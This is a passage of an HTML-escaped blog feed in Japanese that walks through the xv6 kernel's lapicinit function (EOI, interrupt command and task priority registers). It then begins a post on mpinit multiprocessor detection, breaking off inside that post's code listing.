    style=&quot;padding-bottom: 55.00000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAABeUlEQVQoz4WS626CQBCFff8Ha39IKiDKTWMU5aaA0ihync4Zu8a0DSU5mWV359uzszO5Xq/UNA2laUpZllFRFJTnOR2PR4qiiE6nExX5Y+6hjMIwFEWsOI5JMW63G03quiZ8WAiCQDYmSUKbzYYsy6LdbidrCnI4HOQgCPux1ratMMB6AodhkNi2jTgVZ+wWTsuypKqqxAHi5XIRYf58Po8DK07SplN6f38jTdNosVhQylAk4gAlXB9z/wLv1Y1msw8yDJM8z6P9fi9OlKPXCCjgXdeNASuamybphs4yyPd8qSkK/1MoAcCjDpumJt/3xZ3ruhLL8vNZw1cpaN/3I4/Cz79er0WAbbdbatgBkuCk532IaBOVo+KfQMSQW2O5tAXq2LY8jOt6ZJoGOY4jzqMoFugv4P1+lwk4UAq49wyun82w+dxi+FLGAKM3Ta6xx2Vp+TGG7xwwwBKHGCh1fJ2EmxVJcLharQRoMUzXZwJFF6CV4PA1F/9fbf9C6fe4f28AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/a62689b6484885eda853c23b71f5eeee/8ac56/image-2.webp 240w,
/static/a62689b6484885eda853c23b71f5eeee/d3be9/image-2.webp 480w,
/static/a62689b6484885eda853c23b71f5eeee/b0a15/image-2.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/a62689b6484885eda853c23b71f5eeee/8ff5a/image-2.png 240w,
/static/a62689b6484885eda853c23b71f5eeee/e85cb/image-2.png 480w,
/static/a62689b6484885eda853c23b71f5eeee/0b533/image-2.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/a62689b6484885eda853c23b71f5eeee/0b533/image-2.png&quot;
            alt=&quot;2022/02/image-2.png&quot;
            title=&quot;2022/02/image-2.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;http://flint.cs.yale.edu/cs422/doc/24547212.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel SDM vol3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;なんで2回クリアしているのかは、またしても謎です。&lt;/p&gt;
&lt;h3 id=&quot;eoiのチェック&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#eoi%E3%81%AE%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF&quot; aria-label=&quot;eoiのチェック permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;EOIのチェック&lt;/h3&gt;
&lt;p&gt;EOIは&lt;code class=&quot;language-text&quot;&gt;End of interrupt&lt;/code&gt;の略で、特定の割込み処理が完了したことを示す信号で、PICに送信されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Ack any outstanding interrupts.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;EOI&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/End_of_interrupt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;End of interrupt - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;EOIレジスタには互換性のために0をセットしておく必要があります。&lt;/p&gt;
&lt;h3 id=&quot;interrupt-command-registerのセット&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#interrupt-command-register%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88&quot; aria-label=&quot;interrupt command registerのセット permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Interrupt Command Registerのセット&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ICRHI&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;ICRLOはどちらも&lt;/code&gt;Interrupt Command Register`です。&lt;/p&gt;
&lt;p&gt;これら2つのレジスタは、CPUに割込みを送信するために使用されます。&lt;/p&gt;
&lt;p&gt;なお、&lt;code class=&quot;language-text&quot;&gt;(0x0300/4)&lt;/code&gt;にデータが書き込まれたときは割込みが発生しますが、&lt;code class=&quot;language-text&quot;&gt;(0x0310/4)&lt;/code&gt;に書き込まれた時には割込みは発生しないため、&lt;code class=&quot;language-text&quot;&gt;ICRHI&lt;/code&gt;から&lt;code class=&quot;language-text&quot;&gt;ICRHO&lt;/code&gt;の順で値をセットしています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Send an Init Level De-Assert to synchronise arbitration ID&apos;s.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ICRHI&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ICRLO&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; BCAST &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; INIT &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; LEVEL&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lapic&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ICRLO&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; DELIVS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここでは、&lt;code class=&quot;language-text&quot;&gt;INIT Level De-assert&lt;/code&gt;によってシステム内のすべてのローカルAPICに同期メッセージを送信し、その&lt;code class=&quot;language-text&quot;&gt;arbitration ID&lt;/code&gt;をAPICに設定しています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/192a2ec202fe9a196c88a8cd947bd723/0b533/image-3.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 86.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAARlAAAEZQAGA43XUAAACIklEQVQ4y3VUibKiMBD0/3/r7dv1HWpZaLkciiIegAqCKOAxOz2PUChsqsZgjk5Ppyed8/lMRZHT4RDSJcsoz/l7v6cgCChNU0qSROJ0OjUC82EYyvftdiNgdYqiIDTf98myLFosFmSaFs3nc1qtVhKbzYZ0/S/1+32a2Tat12taLpfkuq6sy5gIGsh08IOGQZzyeDykv16vFMcxMz/Q8XhkJhFFUVQxwz6QUfueAO/3u5w6m81oPB4Ly+12K73jOGQzKwRYAVRJgDXoFaknhgmz2e12kiLSh6ZgiM0AgVZRFMr/y+UiLDGfpmfJqgJU+Y80jX6/v5M2GtFkMiHP8yQdsMdCCC6pcpoF/x8Oh9T905WM4jhpAiLdj26XBoMBadqIJ38uC00xQnqPcgyHvr39kkuCxo2UwQTi5nlW2aANEOvQLMukz8+vil0DELfpsch79uC91ERp88SwHAsCX1hC81ZAbEIo3V4BlYaYh11slgi6G4ZBa/apsl4F+NoAVgcEOwCpMZct1Ov1+eaPTR/WAepAdUBEZWQ2PZhpJUPMNRi+Ar4yRLo/l8aFwD0M7zhLqXnI0crwfy0rHw2UIwKAqCJdN8TcrZeCk1DsJqcA01rTqdwgWNUBkTbGfN9jQF0K4AlQGRtl5zIAXhzbnku5KW3ammka9N3rsamjyhWiIfLHhxL9xLU6ZXZ4snA6vvFEIfBAwNDoTdMU7wJM2Q39PwL5F+pagDLJAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/192a2ec202fe9a196c88a8cd947bd723/8ac56/image-3.webp 240w,
/static/192a2ec202fe9a196c88a8cd947bd723/d3be9/image-3.webp 480w,
/static/192a2ec202fe9a196c88a8cd947bd723/b0a15/image-3.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/192a2ec202fe9a196c88a8cd947bd723/8ff5a/image-3.png 240w,
/static/192a2ec202fe9a196c88a8cd947bd723/e85cb/image-3.png 480w,
/static/192a2ec202fe9a196c88a8cd947bd723/0b533/image-3.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/192a2ec202fe9a196c88a8cd947bd723/0b533/image-3.png&quot;
            alt=&quot;2022/02/image-3.png&quot;
            title=&quot;2022/02/image-3.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;http://flint.cs.yale.edu/cs422/doc/24547212.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel SDM vol3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最後に&lt;code class=&quot;language-text&quot;&gt;TPR(Task Priority Register)&lt;/code&gt;に0をセットすることで、CPUがすべての割込みを処理できるようになるため、割込み機能が有効化されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Enable interrupts on the APIC (but not on the processor).&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TPR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ちなみにTPRに15をセットすると、すべての割込みが禁止されます。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;これで&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数から呼び出された&lt;code class=&quot;language-text&quot;&gt;lapicinit&lt;/code&gt;関数の処理が全部終わりました。&lt;/p&gt;
&lt;p&gt;今回いまいち理解できないまま進んでしまった部分も多かったので、わかり次第追記していこうと思います。&lt;/p&gt;
&lt;p&gt;次回はいよいよセグメントディスクリプタです。&lt;/p&gt;
&lt;p&gt;だんだん本格的にカーネルの動きが見えてきて楽しくなってきました。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -マルチプロセッサ 編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルのmain関数の挙動を読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-006-kernel-main-03</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-006-kernel-main-03</guid><pubDate>Mon, 31 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-005-kernel-main-02&quot;&gt;前回&lt;/a&gt;は&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で実行される&lt;code class=&quot;language-text&quot;&gt;kvmalloc&lt;/code&gt;関数によるページテーブル割り当ての挙動を確認しました。&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;mpinit&lt;/code&gt;関数の挙動を追っていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#mpinit%E9%96%A2%E6%95%B0&quot;&gt;mpinit関数&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%90%84%E7%A8%AE%E6%A7%8B%E9%80%A0%E4%BD%93%E5%A4%89%E6%95%B0%E3%81%AE%E5%AE%A3%E8%A8%80&quot;&gt;各種構造体変数の宣言&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mp%E4%BB%95%E6%A7%98%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;MP仕様について&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mp%E3%83%95%E3%83%AD%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%83%9D%E3%82%A4%E3%83%B3%E3%82%BF%E6%A7%8B%E9%80%A0%E4%BD%93%E3%81%AE%E5%8F%96%E5%BE%97&quot;&gt;MPフローティングポインタ構造体の取得&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mp%E3%82%B3%E3%83%B3%E3%83%95%E3%82%A3%E3%82%B0%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AE%E5%8F%96%E5%BE%97&quot;&gt;MPコンフィグレーションテーブルの取得&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mp%E3%82%B3%E3%83%B3%E3%83%95%E3%82%A3%E3%82%B0%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%8B%E3%82%89ioapic%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;MPコンフィグレーションテーブルからIOAPICを取得する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%BB%E3%83%83%E3%82%B5%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;プロセッサの情報を取得する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#processor-entry%E3%81%AE%E6%83%85%E5%A0%B1%E5%8F%96%E5%BE%97&quot;&gt;Processor Entryの情報取得&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ioapic%E3%81%AE%E6%83%85%E5%A0%B1%E5%8F%96%E5%BE%97&quot;&gt;IOAPICの情報取得&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#imcr%E3%81%AE%E5%A4%89%E6%9B%B4&quot;&gt;IMCRの変更&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;mpinit関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mpinit%E9%96%A2%E6%95%B0&quot; aria-label=&quot;mpinit関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;mpinit関数&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mpinit&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;mp.c&lt;/code&gt;で定義されている以下の関数です。&lt;/p&gt;
&lt;p&gt;「mp」はたぶんマルチプロセッサの意ですが、他のプロセッサを検出する役割を持つ関数が&lt;code class=&quot;language-text&quot;&gt;mpinit&lt;/code&gt;関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uchar &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; ismp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;mp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpconf&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpproc&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;proc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ioapic&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpconfig&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;mp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Expect to run on an SMP&quot;&lt;/span&gt;&lt;span class=&quot;token 